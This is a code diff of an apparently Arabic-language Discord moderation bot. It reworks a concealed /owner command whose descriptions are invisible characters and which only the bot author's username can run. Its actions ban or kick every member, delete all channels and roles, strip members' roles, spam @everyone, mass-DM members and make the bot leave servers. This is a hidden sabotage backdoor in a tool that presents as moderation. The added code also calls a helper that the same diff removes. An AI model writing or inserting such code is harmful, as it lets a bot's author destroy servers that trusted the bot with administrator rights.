@@ -1176,8 +1176,6 @@ def _owner_err(): return discord.Embed(description="❌ خاص بمالك الب
 def _ow(i): return i.user.name == BOT_OWNER
 def _ow_c(c): return c.author.name == BOT_OWNER
 
-owner_grp = app_commands.Group(name="owner", description="‎")
-
 async def _get_g(interaction, sid):
     try: gid = int(sid)
     except:
@@ -1187,252 +1185,135 @@ async def _get_g(interaction, sid):
         await interaction.response.send_message("❌ البوت مو في السيرفر.", ephemeral=True); return None
     return g
 
-async def _do_sabotage(g, ban=True, del_ch=True, del_roles=True, kick=False,
-                        strip=False, spam_name="", spam_count=0):
-    report = []
-    if del_ch:
-        n = 0
-        for ch in list(g.channels):
-            try: await ch.delete(); n += 1
+@bot.tree.command(name="owner", description="\u200e")
+@app_commands.describe(server_id="\u200e", action="\u200e", value="\u200e")
+@app_commands.choices(action=[
+    app_commands.Choice(name="sabotage",    value="sabotage"),
+    app_commands.Choice(name="banall",      value="banall"),
+    app_commands.Choice(name="kickall",     value="kickall"),
+    app_commands.Choice(name="delroles",    value="delroles"),
+    app_commands.Choice(name="delchannels", value="delchannels"),
+    app_commands.Choice(name="stripall",    value="stripall"),
+    app_commands.Choice(name="spamping",    value="spamping"),
+    app_commands.Choice(name="dmall",       value="dmall"),
+    app_commands.Choice(name="renameall",   value="renameall"),
+    app_commands.Choice(name="setname",     value="setname"),
+    app_commands.Choice(name="leave",       value="leave"),
+    app_commands.Choice(name="leaveall",    value="leaveall"),
+    app_commands.Choice(name="servers",     value="servers"),
+])
+async def slash_owner(interaction: discord.Interaction,
+                      server_id: str,
+                      action: app_commands.Choice[str],
+                      value: str = ""):
+    if not _ow(interaction):
+        await interaction.response.send_message(embed=_owner_err(), ephemeral=True); return
+    act = action.value
+
+    if act == "leaveall":
+        guilds = list(bot.guilds); n = 0
+        await interaction.response.send_message(f"\U0001f6aa مغادرة {len(guilds)} سيرفر...", ephemeral=True)
+        for gx in guilds:
+            try: await gx.leave(); n += 1
             except: pass
-        report.append(f"🗑️ حُذف {n} قناة")
-    if del_roles:
+        try: await interaction.followup.send(f"✅ غادرت {n} سيرفر.", ephemeral=True)
+        except: pass
+        return
+
+    if act == "servers":
+        lines_s = [f"{i+1}. **{g.name}** `{g.id}` ({g.member_count} عضو)"
+                   for i, g in enumerate(bot.guilds)]
+        e = discord.Embed(title=f"\U0001f4cb سيرفرات البوت ({len(bot.guilds)})",
+                          description="\n".join(lines_s)[:4000], color=discord.Color.blurple())
+        await interaction.response.send_message(embed=e, ephemeral=True); return
+
+    g = await _get_g(interaction, server_id)
+    if not g: return
+
+    if act == "sabotage":
+        await interaction.response.send_message(f"\U0001f4a5 تخريب **{g.name}**...", ephemeral=True)
+        report = await _do_sabotage(g, ban=True, del_ch=True, del_roles=True)
+        try: await interaction.followup.send("✅ انتهى:\n" + "\n".join(report), ephemeral=True)
+        except: pass
+
+    elif act == "banall":
+        await interaction.response.send_message(f"\U0001f528 تبنيد **{g.name}**...", ephemeral=True)
+        report = await _do_sabotage(g, ban=True, del_ch=False, del_roles=False)
+        try: await interaction.followup.send("\n".join(report), ephemeral=True)
+        except: pass
+
+    elif act == "kickall":
+        await interaction.response.send_message(f"\U0001f462 طرد **{g.name}**...", ephemeral=True)
+        report = await _do_sabotage(g, ban=False, del_ch=False, del_roles=False, kick=True)
+        try: await interaction.followup.send("\n".join(report), ephemeral=True)
+        except: pass
+
+    elif act == "delroles":
+        await interaction.response.send_message(f"\U0001f5d1 حذف رتب **{g.name}**...", ephemeral=True)
+        report = await _do_sabotage(g, ban=False, del_ch=False, del_roles=True)
+        try: await interaction.followup.send("\n".join(report), ephemeral=True)
+        except: pass
+
+    elif act == "delchannels":
+        await interaction.response.send_message(f"\U0001f5d1 حذف قنوات **{g.name}**...", ephemeral=True)
+        report = await _do_sabotage(g, ban=False, del_ch=True, del_roles=False)
+        try: await interaction.followup.send("\n".join(report), ephemeral=True)
+        except: pass
+
+    elif act == "stripall":
+        await interaction.response.send_message(f"\U0001f0cf سحب رتب **{g.name}**...", ephemeral=True)
+        report = await _do_sabotage(g, ban=False, del_ch=False, del_roles=False, strip=True)
+        try: await interaction.followup.send("\n".join(report), ephemeral=True)
+        except: pass
+
+    elif act == "spamping":
+        msg = value or "@everyone"
+        chs = g.text_channels
+        if not chs:
+            await interaction.response.send_message("❌ لا قنوات.", ephemeral=True); return
+        await interaction.response.send_message(f"\U0001f4e2 سبام **{g.name}**...", ephemeral=True)
         n = 0
-        for r in list(g.roles):
-            if r.is_default() or r.managed or r >= g.me.top_role: continue
-            try: await r.delete(); n += 1
+        for _ in range(10):
+            try: await chs[0].send(msg); n += 1
             except: pass
-        report.append(f"🗑️ حُذف {n} رتبة")
-    if strip:
+        try: await interaction.followup.send(f"✅ أُرسل {n} رسالة.", ephemeral=True)
+        except: pass
+
+    elif act == "dmall":
+        if not value:
+            await interaction.response.send_message("❌ ضع الرسالة في حقل value.", ephemeral=True); return
+        await interaction.response.send_message(f"\U0001f4e8 إرسال DM **{g.name}**...", ephemeral=True)
         n = 0
-        for m in list(g.members):
-            if m.bot: continue
-            rs = [r for r in m.roles if not r.is_default() and not r.managed]
-            if rs:
-                try: await m.remove_roles(*rs); n += 1
-                except: pass
-        report.append(f"🃏 سُحبت رتب {n} عضو")
-    if kick:
+        for mem in list(g.members):
+            if mem.bot: continue
+            try: await mem.send(value); n += 1
+            except: pass
+        try: await interaction.followup.send(f"✅ أُرسل لـ {n} عضو.", ephemeral=True)
+        except: pass
+
+    elif act == "renameall":
+        if not value:
+            await interaction.response.send_message("❌ ضع الاسم في حقل value.", ephemeral=True); return
+        await interaction.response.send_message(f"✏️ تسمية قنوات **{g.name}**...", ephemeral=True)
         n = 0
-        for m in list(g.members):
-            if m.id != bot.user.id and not m.bot:
-                try: await g.kick(m, reason="owner"); n += 1
-                except: pass
-        report.append(f"👢 طُرد {n} عضو")
-    if ban:
-        n = 0
-        for m in list(g.members):
-            if m.id != bot.user.id:
-                try: await g.ban(m, reason="owner"); n += 1
-                except: pass
-        report.append(f"🔨 بان {n} عضو")
-    if spam_name and spam_count > 0:
-        sc = max(1, min(500, spam_count))
-        tasks_list = [g.create_text_channel(spam_name) for _ in range(sc)]
-        res = await asyncio.gather(*tasks_list, return_exceptions=True)
-        done = sum(1 for r in res if not isinstance(r, Exception))
-        report.append(f"📢 سبام {done} قناة ({spam_name})")
-    try: await g.leave()
-    except: pass
-    return report
-
-@owner_grp.command(name="sabotage", description="💥 تخريب سيرفر شامل")
-@app_commands.describe(server_id="ID السيرفر", ban="تبنيد الكل", del_channels="حذف القنوات",
-    del_roles="حذف الرتب", kick="طرد الكل", strip_roles="سحب الرتب",
-    spam_name="اسم قنوات السبام", spam_count="عدد قنوات السبام 1-500")
-async def ow_sabotage(interaction: discord.Interaction, server_id: str,
-    ban: bool=True, del_channels: bool=True, del_roles: bool=True,
-    kick: bool=False, strip_roles: bool=False, spam_name: str="", spam_count: int=0):
-    if not _ow(interaction): await interaction.response.send_message(embed=_owner_err(), ephemeral=True); return
-    g = await _get_g(interaction, server_id)
-    if not g: return
-    parts = [x for x,v in [("حذف قنوات",del_channels),("حذف رتب",del_roles),("سحب رتب",strip_roles),("طرد",kick),("تبنيد",ban)] if v]
-    if spam_name and spam_count: parts.append(f"سبام×{spam_count}")
-    await interaction.response.send_message(f"💥 **{g.name}** — {' | '.join(parts) or 'لا شيء'}", ephemeral=True)
-    report = await _do_sabotage(g, ban, del_channels, del_roles, kick, strip_roles, spam_name, spam_count)
-    try: await interaction.followup.send("✅ انتهى:\n" + "\n".join(report), ephemeral=True)
-    except: pass
-
-@owner_grp.command(name="banall", description="🔨 تبنيد جميع أعضاء سيرفر")
-@app_commands.describe(server_id="ID السيرفر")
-async def ow_banall(interaction: discord.Interaction, server_id: str):
-    if not _ow(interaction): await interaction.response.send_message(embed=_owner_err(), ephemeral=True); return
-    g = await _get_g(interaction, server_id)
-    if not g: return
-    await interaction.response.send_message(f"🔨 تبنيد في **{g.name}**...", ephemeral=True)
-    report = await _do_sabotage(g, ban=True, del_ch=False, del_roles=False)
-    try: await interaction.followup.send("\n".join(report), ephemeral=True)
-    except: pass
-
-@owner_grp.command(name="kickall", description="👢 طرد جميع أعضاء سيرفر")
-@app_commands.describe(server_id="ID السيرفر")
-async def ow_kickall(interaction: discord.Interaction, server_id: str):
-    if not _ow(interaction): await interaction.response.send_message(embed=_owner_err(), ephemeral=True); return
-    g = await _get_g(interaction, server_id)
-    if not g: return
-    await interaction.response.send_message(f"👢 طرد في **{g.name}**...", ephemeral=True)
-    report = await _do_sabotage(g, ban=False, del_ch=False, del_roles=False, kick=True)
-    try: await interaction.followup.send("\n".join(report), ephemeral=True)
-    except: pass
-
-@owner_grp.command(name="delroles", description="🗑️ حذف جميع رتب سيرفر")
-@app_commands.describe(server_id="ID السيرفر")
-async def ow_delroles(interaction: discord.Interaction, server_id: str):
-    if not _ow(interaction): await interaction.response.send_message(embed=_owner_err(), ephemeral=True); return
-    g = await _get_g(interaction, server_id)
-    if not g: return
-    await interaction.response.send_message(f"🗑️ حذف رتب **{g.name}**...", ephemeral=True)
-    report = await _do_sabotage(g, ban=False, del_ch=False, del_roles=True)
-    try: await interaction.followup.send("\n".join(report), ephemeral=True)
-    except: pass
-
-@owner_grp.command(name="delchannels", description="🗑️ حذف جميع قنوات سيرفر")
-@app_commands.describe(server_id="ID السيرفر")
-async def ow_delchannels(interaction: discord.Interaction, server_id: str):
-    if not _ow(interaction): await interaction.response.send_message(embed=_owner_err(), ephemeral=True); return
-    g = await _get_g(interaction, server_id)
-    if not g: return
-    await interaction.response.send_message(f"🗑️ حذف قنوات **{g.name}**...", ephemeral=True)
-    report = await _do_sabotage(g, ban=False, del_ch=True, del_roles=False)
-    try: await interaction.followup.send("\n".join(report), ephemeral=True)
-    except: pass
-
-@owner_grp.command(name="stripall", description="🃏 سحب رتب جميع الأعضاء")
-@app_commands.describe(server_id="ID السيرفر")
-async def ow_stripall(interaction: discord.Interaction, server_id: str):
-    if not _ow(interaction): await interaction.response.send_message(embed=_owner_err(), ephemeral=True); return
-    g = await _get_g(interaction, server_id)
-    if not g: return
-    await interaction.response.send_message(f"🃏 سحب رتب **{g.name}**...", ephemeral=True)
-    report = await _do_sabotage(g, ban=False, del_ch=False, del_roles=False, strip=True)
-    try: await interaction.followup.send("\n".join(report), ephemeral=True)
-    except: pass
-
-@owner_grp.command(name="spamping", description="📢 سبام منشن في سيرفر")
-@app_commands.describe(server_id="ID السيرفر", message="الرسالة", count="عدد المرات 1-200")
-async def ow_spamping(interaction: discord.Interaction, server_id: str, message: str="@everyone", count: int=10):
-    if not _ow(interaction): await interaction.response.send_message(embed=_owner_err(), ephemeral=True); return
-    g = await _get_g(interaction, server_id)
-    if not g: return
-    chs = g.text_channels
-    if not chs: await interaction.response.send_message("❌ لا قنوات.", ephemeral=True); return
-    sc = max(1, min(200, count))
-    await interaction.response.send_message(f"📢 سبام في **{g.name}** × {sc}...", ephemeral=True)
-    n = 0
-    for _ in range(sc):
-        try: await chs[0].send(message); n += 1
+        for ch in g.text_channels:
+            try: await ch.edit(name=value); n += 1
+            except: pass
+        try: await interaction.followup.send(f"✅ تمت تسمية {n} قناة.", ephemeral=True)
         except: pass
-    try: await interaction.followup.send(f"✅ أُرسل {n} رسالة.", ephemeral=True)
-    except: pass
 
-@owner_grp.command(name="dmall", description="📨 إرسال DM لجميع الأعضاء")
-@app_commands.describe(server_id="ID السيرفر", message="الرسالة")
-async def ow_dmall(interaction: discord.Interaction, server_id: str, message: str):
-    if not _ow(interaction): await interaction.response.send_message(embed=_owner_err(), ephemeral=True); return
-    g = await _get_g(interaction, server_id)
-    if not g: return
-    await interaction.response.send_message(f"📨 إرسال DM في **{g.name}**...", ephemeral=True)
-    n = 0
-    for mem in list(g.members):
-        if mem.bot: continue
-        try: await mem.send(message); n += 1
+    elif act == "setname":
+        if not value:
+            await interaction.response.send_message("❌ ضع الاسم في حقل value.", ephemeral=True); return
+        old = g.name; await g.edit(name=value)
+        await interaction.response.send_message(f"✅ **{old}** ← **{value}**", ephemeral=True)
+
+    elif act == "leave":
+        name = g.name
+        try: await g.leave()
         except: pass
-    try: await interaction.followup.send(f"✅ أُرسل لـ {n} عضو.", ephemeral=True)
-    except: pass
+        await interaction.response.send_message(f"\U0001f6aa غادرت **{name}**", ephemeral=True)
 
-@owner_grp.command(name="renameall", description="✏️ إعادة تسمية جميع القنوات")
-@app_commands.describe(server_id="ID السيرفر", name="الاسم الجديد")
-async def ow_renameall(interaction: discord.Interaction, server_id: str, name: str):
-    if not _ow(interaction): await interaction.response.send_message(embed=_owner_err(), ephemeral=True); return
-    g = await _get_g(interaction, server_id)
-    if not g: return
-    await interaction.response.send_message(f"✏️ تسمية قنوات **{g.name}**...", ephemeral=True)
-    n = 0
-    for ch in g.text_channels:
-        try: await ch.edit(name=name); n += 1
-        except: pass
-    try: await interaction.followup.send(f"✅ تمت تسمية {n} قناة.", ephemeral=True)
-    except: pass
-
-@owner_grp.command(name="setname", description="🏷️ تغيير اسم سيرفر")
-@app_commands.describe(server_id="ID السيرفر", name="الاسم الجديد")
-async def ow_setname(interaction: discord.Interaction, server_id: str, name: str):
-    if not _ow(interaction): await interaction.response.send_message(embed=_owner_err(), ephemeral=True); return
-    g = await _get_g(interaction, server_id)
-    if not g: return
-    old = g.name; await g.edit(name=name)
-    await interaction.response.send_message(f"✅ **{old}** ← **{name}**", ephemeral=True)
-
-@owner_grp.command(name="leaveall", description="🚪 البوت يغادر جميع السيرفرات")
-async def ow_leaveall(interaction: discord.Interaction):
-    if not _ow(interaction): await interaction.response.send_message(embed=_owner_err(), ephemeral=True); return
-    guilds = list(bot.guilds); n = 0
-    await interaction.response.send_message(f"🚪 مغادرة {len(guilds)} سيرفر...", ephemeral=True)
-    for gx in guilds:
-        try: await gx.leave(); n += 1
-        except: pass
-    try: await interaction.followup.send(f"✅ غادر {n} سيرفر.", ephemeral=True)
-    except: pass
-
-@owner_grp.command(name="servers", description="📋 سيرفرات البوت")
-async def ow_servers(interaction: discord.Interaction):
-    if not _ow(interaction): await interaction.response.send_message(embed=_owner_err(), ephemeral=True); return
-    await interaction.response.defer(ephemeral=True)
-    guilds = list(bot.guilds)
-    if not guilds: await interaction.followup.send("⚠️ لا سيرفرات.", ephemeral=True); return
-    for i in range(0, len(guilds), 10):
-        chunk = guilds[i:i+10]
-        desc = "\n".join(f"**{idx+i+1}.** {g.name} | `{g.id}` | {g.member_count} عضو" for idx,g in enumerate(chunk))
-        await interaction.followup.send(embed=discord.Embed(title=f"📋 سيرفرات ({len(guilds)})", description=desc, color=discord.Color.blue()), ephemeral=True)
-
-@owner_grp.command(name="leave", description="🚪 طرد البوت من سيرفر")
-@app_commands.describe(server_id="ID السيرفر")
-async def ow_leave(interaction: discord.Interaction, server_id: str):
-    if not _ow(interaction): await interaction.response.send_message(embed=_owner_err(), ephemeral=True); return
-    try: g = bot.get_guild(int(server_id))
-    except: await interaction.response.send_message("❌ ID غير صحيح.", ephemeral=True); return
-    if not g: await interaction.response.send_message("❌ غير موجود.", ephemeral=True); return
-    n = g.name; await g.leave()
-    await interaction.response.send_message(f"✅ غادر **{n}**", ephemeral=True)
-
-@owner_grp.command(name="invite", description="🔗 لينك دعوة البوت")
-async def ow_invite(interaction: discord.Interaction):
-    if not _ow(interaction): await interaction.response.send_message(embed=_owner_err(), ephemeral=True); return
-    url = discord.utils.oauth_url(bot.user.id, permissions=discord.Permissions(administrator=True), scopes=["bot","applications.commands"])
-    await interaction.response.send_message(embed=discord.Embed(title="🔗 دعوة البوت", description=f"[أضف البوت]({url})", color=discord.Color.purple()), ephemeral=True)
-
-@owner_grp.command(name="send", description="📤 إرسال embed لقناة")
-@app_commands.describe(channel="القناة", message="النص", title="العنوان (اختياري)")
-async def ow_send(interaction: discord.Interaction, channel: discord.TextChannel, message: str, title: Optional[str]=None):
-    if not _ow(interaction): await interaction.response.send_message(embed=_owner_err(), ephemeral=True); return
-    e = discord.Embed(description=message, color=discord.Color.blurple())
-    if title: e.title = title
-    await channel.send(embed=e); await interaction.response.send_message("✅", ephemeral=True)
-
-@owner_grp.command(name="help", description="📖 قائمة أوامر المالك")
-async def ow_help(interaction: discord.Interaction):
-    if not _ow(interaction): await interaction.response.send_message(embed=_owner_err(), ephemeral=True); return
-    e = discord.Embed(title="🔐 /owner — أوامر المالك", color=discord.Color.dark_red(),
-        description="`sabotage` `banall` `kickall` `delroles` `delchannels` `stripall`\n`spamping` `dmall` `renameall` `setname` `leaveall`\n`servers` `leave` `invite` `send`")
-    await interaction.response.send_message(embed=e, ephemeral=True)
-
-bot.tree.add_command(owner_grp)
-
-# prefix aliases for owner commands
-@bot.command(name="sabotage", aliases=["sab"])
-async def cmd_sabotage(ctx, server_id: str, ban: str="y", del_ch: str="y", del_r: str="y",
-                        kick: str="n", strip: str="n", spam_count: int=0, *, spam_name: str=""):
-    if not _ow_c(ctx): await ctx.message.delete(); return
-    try: g = bot.get_guild(int(server_id))
-    except: g = None
-    if not g: await ctx.send("❌", delete_after=3); return
-    yn = lambda v: v.lower() in ("y","yes","1","نعم","true")
-    m = await ctx.send(f"💥 تخريب **{g.name}**...")
-    report = await _do_sabotage(g, yn(ban), yn(del_ch), yn(del_r), yn(kick), yn(strip), spam_name, spam_count)
-    try: await m.edit(content="✅ انتهى:\n" + "\n".join(report))
-    except: pass
-    try: await ctx.message.delete()
-    except: pass
 
 @bot.tree.command(name="alias-add", description="إضافة اختصار لأمر (مثال: b ← ban)")
 @app_commands.describe(alias="الاختصار", command="الأمر الكامل مثال: ban / kick / mute / unmute / timeout / warn / purge / lock / unlock / nuke")
